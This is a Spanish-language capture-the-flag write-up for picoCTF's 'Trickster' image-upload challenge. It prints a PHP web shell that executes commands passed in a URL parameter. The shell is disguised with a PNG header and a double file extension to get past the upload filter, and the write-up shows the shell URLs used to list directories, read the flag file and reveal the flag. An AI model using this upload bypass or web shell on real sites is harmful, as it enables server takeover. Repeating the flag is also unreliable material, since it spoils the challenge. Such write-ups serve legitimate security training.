
## Trickster
I found a web app that can help process images: PNG images only!Try it [here](http://atlas.picoctf.net:60892/)!


Hints:
(None)



## Solución:

```
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222}

//Crear el archivo
wshell.php y después cambiar a wshell.png.php
PNG
<?php
if(isset($_GET['cmd'])){
     echo "<pre>";
     system($_GET['cmd']);
     echo "<pre>";
}
?>

//Con este ver en que carpeta estamos
http://atlas.picoctf.net:60892/uploads/wshell.png.php?cmd=pwd

//Entramos aquí , y ver en que carpeta estamos y regresarnos con ls ..
http://atlas.picoctf.net:60892/uploads/wshell.png.php?cmd=ls%20..
PNG
GNTDOMBWGIZDE.txt
index.php
instructions.txt
robots.txt
uploads



Parte:
http://atlas.picoctf.net:60892/uploads/wshell.png.php?cmd=cat%20../GNTDOMBWGIZDE.txt
Entrar ahí y copiar el nombre del archivo, pero ponerle cat primero- cat ../GNTDOMBWGIZDE.txt
GNTDOMBWGIZDE.txt



Flag: picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222}
PNG

/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222} */

```